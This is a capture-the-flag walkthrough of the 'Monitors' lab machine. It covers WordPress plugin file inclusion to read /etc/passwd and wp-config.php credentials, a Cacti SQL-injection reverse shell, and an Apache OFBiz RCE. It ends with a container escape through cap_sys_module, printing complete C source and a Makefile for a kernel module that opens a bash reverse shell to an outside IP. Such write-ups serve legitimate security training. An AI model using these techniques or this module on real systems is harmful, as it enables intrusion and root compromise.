# Monitors

## Gaining Access

Nmap scan:

![](<../../../.gitbook/assets/image%20(2253).png>)

We can add `monitors.htb` to our `/etc/hosts` file.

### Wordpress Site

Port 80 hosts a Wordpress site.

![](<../../../.gitbook/assets/image%20(668).png>)

We can run `wpscan` to enumerate the plugins and version, and this finds that **wp-with-spritz** is being used.

![](<../../../.gitbook/assets/image%20(841).png>)

This version is vulnerable to RFI.

![](<../../../.gitbook/assets/image%20(1738).png>)

We can confirm this by viewing the `/etc/passwd` file.

![](<../../../.gitbook/assets/image%20(569).png>)

After further enumeration, there's nothing else that I could find. So we probably need to read more files within this machine. I could not read any user files, so I tried to check some configuration files for the server at `/etc/apache2/sites-enabled/000-default.conf`.

![](<../../../.gitbook/assets/image%20(2096).png>)

We can find a new domain at `cacti-admin.monitors.htb`. Afterwards, I also read the Wordpress configuration files at `/var/www/wordpress/wp-config.php` to find a password.

![](<../../../.gitbook/assets/image%20(2871).png>)

### Cacti

Upon visting this separate domain, we are greeted by another login page:

![](<../../../.gitbook/assets/image%20(549).png>)

This version of Cacti is old and vulnerable to loads of exploits. We can login with the credentials for Wordpress. Afterwards, we can use an exploit that uses SQL injection to gain a reverse shell.

![](<../../../.gitbook/assets/image%20(3771).png>)

![](<../../../.gitbook/assets/image%20(3230).png>)

We now have remote access as the user `marcus` and can capture the user flag.

## Privilege Escalation

### Docker Image

In the user's directory, we find a `note.txt` file that points towards a docker image being present.

![](<../../../.gitbook/assets/image%20(672).png>)

I read the configuration files at `/etc/containerd`, and found that the `root` user was running the image.

![](<../../../.gitbook/assets/image%20(2488).png>)

We can check the open ports of this machine via `netstat -tulpn` to see other open ports.

![](<../../../.gitbook/assets/image%20(2638).png>)

Port 8443 was open and we could access it. The next step is port forwarding.

### OfBiz RCE

I used `ssh -L 8443:localhost:8443 marcus@monitors.htb` to port forward after dropping my public key in the `authorized_keys` folder. Then, I used `gobuster` to find hidden directories present:

![](<../../../.gitbook/assets/image%20(2328).png>)

Visting any of these would redirect us to `/content/control/main`, where there is a login page present.

![](<../../../.gitbook/assets/image%20(1352).png>)

The bottom of the page shows that this is running Apache OFBiz Release 17.12.01, which is vulnerable to loads of exploits, including an RCE one.

![](<../../../.gitbook/assets/image%20(2787).png>)

We can follow the PoC here to execute it:

{% embed url="https://github.com/g33xter/CVE-2020-9496" %}

Then, we would gain a shell as root in the container.

![](<../../../.gitbook/assets/image%20(1225).png>)

### Sys Module Exploit

There was nothing much within this machien that was interesting. I decided to check the capabilities of the container and found that `cap_sys_module` was enabled. This allows us to escape the container.

First we need to create a new Kernel module with some C code:

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.3/8888 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Then we need we need to create a `Makefile`:

```
obj-m +=reverse-shell.o

all:
        make -C /lib/modules/4.15.0-generic/build M=/root modules

clean:
        make -C /lib/modules/4.15.0-generic/build M=/root clean
```

Get them both into the root directory and start listening on a port. Afterwards, we can run `make` and `insmod reverse-shell.ko`. This would trigger the reverse shell, and give us a shell as `root`.

![](<../../../.gitbook/assets/image%20(811).png>)
